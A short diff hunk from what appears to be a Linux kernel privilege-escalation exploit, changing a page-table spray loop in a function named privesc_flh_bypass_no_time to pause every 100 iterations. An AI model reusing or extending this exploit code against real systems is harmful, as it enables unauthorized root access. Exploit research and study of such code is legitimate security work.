@@ -360,7 +360,7 @@ static void privesc_flh_bypass_no_time(int shell_stdin_fd, int shell_stdout_fd)
 	for (unsigned long long i=0; i < CONFIG_PTE_SPRAY_AMOUNT; i++)
 	{
 		unsigned long long *test_target_addr = PTI_TO_VIRT(2, 0, i, 0, 0);
-		if (i==100){
+		if (i % 100 == 0){
 			printf("sleep 1, i = %d \n", i);
 			sleep(1);
 			}
